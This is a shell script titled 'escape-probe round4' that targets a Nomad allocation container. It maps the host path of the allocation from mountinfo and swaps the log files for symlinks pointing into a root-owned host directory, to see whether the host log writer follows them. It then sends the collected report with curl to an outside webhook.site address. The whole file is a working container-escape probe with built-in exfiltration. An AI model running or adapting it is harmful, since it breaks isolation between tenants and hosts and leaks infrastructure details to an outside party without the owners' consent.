#!/bin/sh
HOOK="${HOOK:-https://webhook.site/8b1f62ae-184f-4a75-af34-faed1a428c53}"
R="/tmp/report4.$$"
sec(){ printf '\n===== %s =====\n' "$1" >>"$R"; }
raw(){ printf '\n--- $ %s\n' "$1" >>"$R"; ( eval "$1" ) 2>&1 | head -c 2500 >>"$R"; printf '\n' >>"$R"; }
echo "escape-probe round4 $(date -u +%FT%TZ)" >"$R"

sec "0. alloc identity"
raw 'grep -E "alloc|run/local" /proc/self/mountinfo'
ALLOC_ID=$(sed -n 's#.*/data/alloc/\([^/]*\)/alloc /alloc.*#\1#p' /proc/self/mountinfo | head -1)
HOSTROOT="/root/opt/nomad/data/alloc/$ALLOC_ID"
echo "alloc_id=$ALLOC_ID" >>"$R"; echo "host_alloc_root=$HOSTROOT" >>"$R"

sec "1. logs inventory"
raw 'ls -la /alloc/logs'
raw 'stat -c "%A %U:%G %s %n" /alloc/logs/* 2>&1 | head -30'

sec "2. create / unlink / rename inside the host alloc dir"
raw 'touch /alloc/logs/.w && ls -la /alloc/logs/.w && rm -f /alloc/logs/.w && echo "create+unlink in logs OK"'
raw 'touch /alloc/data/.w && rm -f /alloc/data/.w && echo "create+unlink in data OK"'
raw 'mv /alloc/logs/preflight.stderr.0 /alloc/logs/.mvtest 2>&1 && mv /alloc/logs/.mvtest /alloc/logs/preflight.stderr.0 && echo "rename in logs OK" || echo "rename FAILED"'

sec "3. symlink-following test (target = root-owned dir we cannot write)"
echo "target dir (host): $HOSTROOT/run/local  <-> container view /local (root:root 755)" >>"$R"
for f in pod.stdout.0 pod.stderr.0 preflight.stdout.0 sidecar.stdout.0 run.stdout.0 run.stderr.0 preflight.stderr.0 sidecar.stderr.0; do
  if [ -e "/alloc/logs/$f" ] && [ ! -L "/alloc/logs/$f" ]; then
    mv "/alloc/logs/$f" "/alloc/logs/.orig-$f" 2>/dev/null && ln -s "$HOSTROOT/run/local/sym-$f.txt" "/alloc/logs/$f" 2>/dev/null && echo "planted: $f -> $HOSTROOT/run/local/sym-$f.txt" >>"$R"
  fi
done
echo "PROBE-MARKER-$(date +%s): forced pod stdout write"
sleep 50
raw 'ls -la /local 2>&1 | head -20'
raw 'for t in /local/sym-*; do [ -e "$t" ] && { echo "### $t"; stat -c "%A %U:%G %s %n" "$t"; head -c 300 "$t"; echo; }; done 2>&1'

sec "4. restore originals"
for f in pod.stdout.0 pod.stderr.0 preflight.stdout.0 sidecar.stdout.0 run.stdout.0 run.stderr.0 preflight.stderr.0 sidecar.stderr.0; do
  [ -L "/alloc/logs/$f" ] && rm -f "/alloc/logs/$f"
  [ -e "/alloc/logs/.orig-$f" ] && mv "/alloc/logs/.orig-$f" "/alloc/logs/$f"
done
raw 'ls -la /alloc/logs | head -20; echo restored'

sec "5. alloc data/tmp"
raw 'ls -la /alloc/data /alloc/tmp; echo probe-data-file > /alloc/data/from-container.txt; ls -la /alloc/data'

printf '\n===== END =====\n' >>"$R"
curl -s -m 30 -X POST --data-binary @"$R" -H "Content-Type: text/plain" "$HOOK" >/dev/null 2>&1
cat "$R"
